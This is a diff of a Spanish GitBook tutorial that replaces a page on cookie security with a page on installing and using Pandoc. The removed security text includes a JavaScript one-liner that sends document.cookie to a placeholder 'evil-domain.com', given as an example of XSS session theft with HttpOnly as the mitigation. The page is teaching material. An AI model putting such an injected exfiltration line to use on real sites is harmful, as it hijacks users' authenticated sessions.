@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>Seguridad · GitBook</title>
+        <title>Pandoc · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.2">
@@ -57,10 +57,8 @@
     <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="seguimiento-privacidad.html" />
     
-    
-    <link rel="prev" href="creando-cookies.html" />
+    <link rel="prev" href="gitbook.html" />
     
 
     </head>
@@ -129,9 +127,9 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="1.3.1" data-path="../herramientas/nodejs.html">
+        <li class="chapter " data-level="1.3.1" data-path="nodejs.html">
             
-                <a href="../herramientas/nodejs.html">
+                <a href="nodejs.html">
             
                     
                     NodeJS
@@ -142,9 +140,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.3.2" data-path="../herramientas/npm.html">
+        <li class="chapter " data-level="1.3.2" data-path="npm.html">
             
-                <a href="../herramientas/npm.html">
+                <a href="npm.html">
             
                     
                     npm
@@ -155,9 +153,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.3.3" data-path="../herramientas/git.html">
+        <li class="chapter " data-level="1.3.3" data-path="git.html">
             
-                <a href="../herramientas/git.html">
+                <a href="git.html">
             
                     
                     Git
@@ -168,9 +166,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.3.4" data-path="../herramientas/gitbook.html">
+        <li class="chapter " data-level="1.3.4" data-path="gitbook.html">
             
-                <a href="../herramientas/gitbook.html">
+                <a href="gitbook.html">
             
                     
                     Gitbook
@@ -181,9 +179,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.3.5" data-path="../herramientas/pandoc.html">
+        <li class="chapter active" data-level="1.3.5" data-path="pandoc.html">
             
-                <a href="../herramientas/pandoc.html">
+                <a href="pandoc.html">
             
                     
                     Pandoc
@@ -568,9 +566,9 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="1.9.1" data-path="definicion.html">
+        <li class="chapter " data-level="1.9.1" data-path="../http-cookies/definicion.html">
             
-                <a href="definicion.html">
+                <a href="../http-cookies/definicion.html">
             
                     
                     Definición
@@ -581,9 +579,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.9.2" data-path="creando-cookies.html">
+        <li class="chapter " data-level="1.9.2" data-path="../http-cookies/creando-cookies.html">
             
-                <a href="creando-cookies.html">
+                <a href="../http-cookies/creando-cookies.html">
             
                     
                     Creando cookies
@@ -594,9 +592,9 @@
             
         </li>
     
-        <li class="chapter active" data-level="1.9.3" data-path="seguridad.html">
+        <li class="chapter " data-level="1.9.3" data-path="../http-cookies/seguridad.html">
             
-                <a href="seguridad.html">
+                <a href="../http-cookies/seguridad.html">
             
                     
                     Seguridad
@@ -607,9 +605,9 @@
             
         </li>
     
-        <li class="chapter " data-level="1.9.4" data-path="seguimiento-privacidad.html">
+        <li class="chapter " data-level="1.9.4" data-path="../http-cookies/seguimiento-privacidad.html">
             
-                <a href="seguimiento-privacidad.html">
+                <a href="../http-cookies/seguimiento-privacidad.html">
             
                     
                     Seguimiento y privacidad
@@ -874,7 +872,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href=".." >Seguridad</a>
+        <a href=".." >Pandoc</a>
     </h1>
 </div>
 
@@ -889,18 +887,67 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="seguridad">Seguridad</h1>
-<h4 id="robos-de-sesiones-y-xss">Robos de sesiones y XSS</h4>
-<p>Las cookies son frecuentemente usadas para identificar a usuarios y sus sesiones autenticadas. Por lo que robar una cookie podr&#xED;a significar robar la sesi&#xF3;n de un usuario. Una forma comun de robar cookies es aprovechando la vulnerabilidad XSS de la aplicaci&#xF3;n.</p>
-<pre><code class="lang-js">(<span class="hljs-keyword">new</span> Image()).src = <span class="hljs-string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> + <span class="hljs-built_in">document</span>.cookie;
-</code></pre>
-<p>Los <strong>cookies HttpOnly</strong> pueden ayudar a mitigar este ataque ya que impiden el acceso al valor de las cookies mediante c&#xF3;digo Javascript.</p>
-<h4 id="cross-site-qurest-forgery-csrf">Cross-site qurest forgery (CSRF)</h4>
-<p>O falsificaci&#xF3;n de petici&#xF3;n en sitios cruzados. Este ataque fuerza al navegador web de su v&#xED;ctima, validado en alg&#xFA;n servicio a enviar una petici&#xF3;n a una aplicaci&#xF3;n web vulnerable.</p>
+                                <h3 id="pandoc">Pandoc</h3>
+<p>Creado originalmente por John MacFarlane, un profesor de Filosof&#xED;a en la Universidad de California, Berkeley, es un <strong>conversor de documentos libre y de c&#xF3;digo abierto</strong> capaz de soportar m&#xFA;ltiples tipos de formatos, Markdown y HTML entre ellos.</p>
+<h4 id="instalaci&#xF3;n">Instalaci&#xF3;n</h4>
 <ul>
-<li><a href="https://github.com/samyk/evercookie" target="_blank">Evercookie by Samy Kamkar</a></li>
-<li><a href="https://en.wikipedia.org/wiki/Zombie_cookie" target="_blank">Zombie cookies on Wikipedia</a></li>
+<li><h5 id="mediante-instalador">Mediante instalador</h5>
+<p>Podemos descarga el instalador desde la p&#xE1;gina en github <a href="https://github.com/jgm/pandoc/releases/tag/1.19.2.1" target="_blank">https://github.com/jgm/pandoc/releases/tag/1.19.2.1</a>. Posteriormente lo ejecutamos y seguimos los pasos para su instalaci&#xF3;n.
+  <img src="img/pandoc_install.png" alt="Instalacion Pandoc"></p>
+</li>
+<li><h4 id="mediante-homebrew">Mediante homebrew</h4>
+<p>Ejecutaremos el comando:</p>
+<pre><code class="lang-bash">$ brew install pandoc
+</code></pre>
+</li>
 </ul>
+<hr>
+<p>Para comprobar si se instal&#xF3; correctamente ejecutaremos el comando:</p>
+<pre><code class="lang-bash">$ pandoc --version
+</code></pre>
+<p>obteniendo la versi&#xF3;n de Pandoc instalada.</p>
+<hr>
+<h4 id="uso">Uso</h4>
+<p>Una vez tengamos Pandoc instalado, podemos usarlo de dos formas: especificando el c&#xF3;digo Markdown en la l&#xED;nea de comandos, o especificar el nombre del archivo. Es importante saber que podemos convertir tanto de Markdown a HTML como viceversa.</p>
+<ul>
+<li><h4 id="por-l&#xED;nea-de-comandos">Por l&#xED;nea de comandos</h4>
+</li>
+</ul>
+<p>Escribiremos:</p>
+<pre><code class="lang-bash">$ pandoc
+</code></pre>
+<p>lo que iniciar&#xE1; Pandoc y se quedar&#xE1; esperando a que introduzcamos algo por teclado. Podemos introducir algo en Markdown como:</p>
+<pre><code class="lang-bash">Hola *pandoc*!
+
+- uno
+- dos
+</code></pre>
+<p>Si pulsamos ctrl-D, le indicaremos a Pandoc que hemos acabado y traducir&#xE1; el c&#xF3;digo Markdown, y nos mostrar&#xE1; por pantalla el c&#xF3;digo HTML resultante:</p>
+<pre><code class="lang-bash">&lt;p&gt;Hola &lt;em&gt;pandoc&lt;/em&gt;!&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;uno&lt;/li&gt;
+&lt;li&gt;dos&lt;/li&gt;
+&lt;/ul&gt;
+</code></pre>
+<p>Si lo queremos introducir en HTML y obtener Markdown, debemos iniciar el programa de la siguiente manera:</p>
+<pre><code class="lang-bash">$ pandoc <span class="hljs-_">-f</span> html -t markdown
+</code></pre>
+<p>y a continuaci&#xF3;n introducir nuestro c&#xF3;digo en HTML, presionar ctrl-D y obtendremos por pantalla el c&#xF3;digo Markdown.</p>
+<ul>
+<li><h4 id="especificando-un-fichero">Especificando un fichero</h4>
+</li>
+</ul>
+<p>Lo primero que debemos hacer es asegurarnos de que estamos en el directorio donde se encuentra el fichero Markdown. Para ello, podemos hacer uso del comando:</p>
+<pre><code class="lang-bash">$ <span class="hljs-built_in">pwd</span>
+</code></pre>
+<p>obteniendo por pantalla el directorio actual. Una vez que estemos seguros, inciaremos el programa con las siguientes opciones:</p>
+<pre><code class="lang-bash">$ pandoc <span class="hljs-built_in">test</span>1.md <span class="hljs-_">-f</span> markdown -t html <span class="hljs-_">-s</span> -o <span class="hljs-built_in">test</span>1.html
+</code></pre>
+<p>lo que exportar&#xE1; el c&#xF3;digo HTML en el fichero &quot;test1.html&quot;.</p>
+<p>Si queremos hacerlo al contrario, bastar&#xE1; con cambiar el lugar de algunos argumentos:</p>
+<pre><code class="lang-bash">$ pandoc <span class="hljs-built_in">test</span>1.html <span class="hljs-_">-f</span> html -t markdown <span class="hljs-_">-s</span> -o <span class="hljs-built_in">test</span>1.md
+</code></pre>
+<hr>
 
                                 
                                 </section>
@@ -928,14 +975,10 @@
 
             
                 
-                <a href="creando-cookies.html" class="navigation navigation-prev " aria-label="Previous page: Creando cookies">
+                <a href="gitbook.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: Gitbook">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
-                
-                <a href="seguimiento-privacidad.html" class="navigation navigation-next " aria-label="Next page: Seguimiento y privacidad">
-                    <i class="fa fa-angle-right"></i>
-                </a>
                 
             
         
@@ -944,7 +987,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Seguridad","level":"1.9.3","depth":2,"next":{"title":"Seguimiento y privacidad","level":"1.9.4","depth":2,"path":"http-cookies/seguimiento-privacidad.md","ref":"http-cookies/seguimiento-privacidad.md","articles":[]},"previous":{"title":"Creando cookies","level":"1.9.2","depth":2,"path":"http-cookies/creando-cookies.md","ref":"http-cookies/creando-cookies.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"http-cookies/seguridad.md","mtime":"2017-03-15T18:25:39.000Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2017-03-15T21:17:43.069Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Pandoc","level":"1.3.5","depth":2,"next":{"title":"Markdown","level":"1.4","depth":1,"ref":"","articles":[{"title":"Definición","level":"1.4.1","depth":2,"path":"markdown/definicion.md","ref":"markdown/definicion.md","articles":[]},{"title":"Aprendizaje","level":"1.4.2","depth":2,"path":"markdown/aprendizaje.md","ref":"markdown/aprendizaje.md","articles":[]}]},"previous":{"title":"Gitbook","level":"1.3.4","depth":2,"path":"herramientas/gitbook.md","ref":"herramientas/gitbook.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"herramientas/pandoc.md","mtime":"2017-02-14T21:32:19.000Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2017-03-15T21:17:43.069Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
